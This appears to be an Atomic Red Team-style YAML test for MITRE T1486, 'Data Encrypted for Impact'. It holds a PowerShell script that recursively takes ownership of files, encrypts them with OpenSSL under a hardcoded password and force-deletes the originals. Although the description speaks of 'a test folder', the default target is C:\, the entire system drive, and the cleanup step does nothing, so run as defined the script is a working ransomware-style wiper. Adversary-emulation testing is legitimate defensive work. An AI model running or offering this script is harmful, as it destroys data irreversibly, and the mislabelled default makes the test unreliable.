attack_technique: T1486
display_name: Data Encrypted for Impact (Destructive Version)
atomic_tests:
- name: Encrypt and delete files recursively in a test folder
  auto_generated_guid: custom-guid-1234567890abcdef
  description: |
    This test encrypts all files in a test folder using a strong password and then deletes the original files.
    WARNING: THIS IS A DESTRUCTIVE ACTION AND SHOULD ONLY BE RUN IN A CONTROLLED ENVIRONMENT.
  supported_platforms:
  - windows
  input_arguments:
    encryption_password:
      description: Password to use for encryption
      type: string
      default: ChaymaOumayma2025
    target_directory:
      description: Directory to encrypt and delete files from
      type: path
      default: C:\
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Checks if openssl is installed
    prereq_command: |
      if (Get-Command openssl -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
    get_prereq_command: |
      Write-Host "Installing OpenSSL..."
      Invoke-WebRequest "https://slproweb.com/download/Win64OpenSSL_Light-3_2_1.exe" -OutFile "$env:TEMP\openssl-installer.exe"
      Start-Process "$env:TEMP\openssl-installer.exe" -ArgumentList "/S" -Wait
  executor:
    name: powershell
    elevation_required: true
    command: |
      $password = "#{encryption_password}"
      $targetDir = "#{target_directory}"

      # Check if the target directory exists
      if (-Not (Test-Path $targetDir)) {
          Write-Host "Le répertoire cible $targetDir n'existe pas."
          exit 1
      }

      Write-Host "Démarrage du chiffrement des fichiers dans $targetDir de manière récursive..."

      # Encrypt files recursively
      Get-ChildItem -Path $targetDir -Recurse -File | ForEach-Object {
          $file = $_.FullName

          # Display the current file being processed
          Write-Host "Traitement du fichier: $file"

          # Take ownership of the file
          Write-Host "Prendre possession du fichier: $file"
          takeown /F $file /A
          icacls $file /grant Administrators:F /T /C

          # Encrypt the file with OpenSSL
          $encryptedFile = "$file.enc"
          Write-Host "Chiffrement du fichier: $file -> $encryptedFile"
          openssl enc -aes-256-cbc -salt -pbkdf2 -iter 10000 -in $file -out $encryptedFile -pass pass:$password

          if ($LASTEXITCODE -eq 0) {
              Write-Host "Fichier chiffré avec succès: $file -> $encryptedFile"

              # Delete the original file after successful encryption
              Write-Host "Suppression du fichier original: $file"
              Remove-Item -Path $file -Force
              Write-Host "Fichier supprimé avec succès: $file"
          } else {
              Write-Host "Échec du chiffrement pour le fichier: $file"
          }
      }

      Write-Host "Processus de chiffrement et de suppression terminé."
    cleanup_command: |
      Write-Host "No cleanup performed for destructive actions."
